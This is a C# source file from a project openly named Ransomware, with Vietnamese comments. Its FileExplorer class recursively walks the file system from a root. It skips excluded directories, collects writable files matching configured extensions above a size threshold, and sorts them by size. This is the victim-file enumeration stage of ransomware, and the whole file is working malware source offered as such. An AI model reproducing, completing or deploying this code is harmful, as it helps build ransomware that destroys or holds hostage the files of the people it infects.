// Copyright (C) PhcNguyen Developers
// Distributed under the terms of the Modified BSD License.

using Ransomware.Sources.Utils;
using System.Collections.Concurrent;


namespace Ransomware.Sources.Application;
class FileExplorer
{
    private bool isRunning;
    private readonly HashSet<string> excludedDirectories; // Danh sách thư mục bị loại trừ
    private readonly HashSet<string> allowedFileExtensions; // Danh sách định dạng file được cho phép
    public ConcurrentBag<FileDetail> SpecificFiles { get; private set; } // Danh sách file cụ thể

    public FileExplorer()
    {
        // Khởi tạo danh sách thư mục cần bỏ qua
        this.excludedDirectories = new HashSet<string>(EnvironmentInspector.DirectoriesToSkip());

        // Khởi tạo danh sách định dạng file cần lưu
        this.allowedFileExtensions = Config.LoadExtensions();

        this.isRunning = false;  
        this.SpecificFiles = new ConcurrentBag<FileDetail>();  
    }

    private bool StartsWithAny(this string str, HashSet<string> prefixes)
    {
        // Kiểm tra xem chuỗi có bắt đầu bằng bất kỳ tiền tố nào không
        return prefixes.Any(prefix => str.StartsWith(prefix, StringComparison.OrdinalIgnoreCase));
    }

    private bool IsWritable(string path)
    {
        try
        {
            if (File.Exists(path))
            {
                using (FileStream fs = File.Open(path, FileMode.Open, FileAccess.Write)) { return true; }
            }
            else if (Directory.Exists(path))
            {
                var dirInfo = new DirectoryInfo(path);
                return !dirInfo.Attributes.HasFlag(FileAttributes.ReadOnly);
            }
        }
        catch (UnauthorizedAccessException) { return false; }
        catch (IOException) { return false; }

        return false;
    }

    private void FindFiles(string path)
    {
        try
        {
            // Bỏ qua thư mục
            if (this.excludedDirectories.Contains(path) || path.StartsWithAny(this.excludedDirectories)) 
                return;

            // Lấy các file trong thư mục
            var files = Directory.EnumerateFiles(path)
                .Where(file => this.allowedFileExtensions.Contains(Path.GetExtension(file))) 
                .ToList();

            Parallel.ForEach(files, (file) =>
            {
                if (IsWritable(file))
                {
                    long fileSize = new FileInfo(file).Length; // Lấy kích thước file
                    this.SpecificFiles.Add(new FileDetail(file, fileSize)); 
                }
            });

            // Lấy các thư mục con
            var directories = Directory.EnumerateDirectories(path)
                .Where(dir => !this.excludedDirectories.Contains(dir) && !dir.StartsWithAny(this.excludedDirectories)) 
                .ToList();

            // Xử lý các thư mục con
            Parallel.ForEach(directories, FindFiles); // Gọi trực tiếp phương thức
        }
        catch (UnauthorizedAccessException)
        {
            Console.WriteLine($"Không có quyền truy cập vào {path}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Lỗi: {ex.Message}");
        }
    }

    public enum SortOrder
    {
        Ascending,  // Từ nhỏ đến lớn
        Descending  // Từ lớn đến nhỏ
    }

    public List<FileDetail> Scan(long minimumSize = 1024 * 1024, SortOrder sortOrder = SortOrder.Ascending)
    {
        if (!this.isRunning) 
        {
            FindFiles(EnvironmentInspector.Root());
            this.isRunning = true; 
        }

        // Lọc và sắp xếp theo kích thước dựa trên kiểu sắp xếp
        return sortOrder == SortOrder.Descending
            ? this.SpecificFiles
                .Where(fileDetail => fileDetail.Size > minimumSize)
                .OrderByDescending(fileDetail => fileDetail.Size) // Sắp xếp từ lớn đến nhỏ
                .ToList() // Chuyển đổi sang List<FileDetail>
            : this.SpecificFiles
                .Where(fileDetail => fileDetail.Size > minimumSize)
                .OrderBy(fileDetail => fileDetail.Size) // Sắp xếp từ nhỏ đến lớn
                .ToList(); // Chuyển đổi sang List<FileDetail>
    }
}
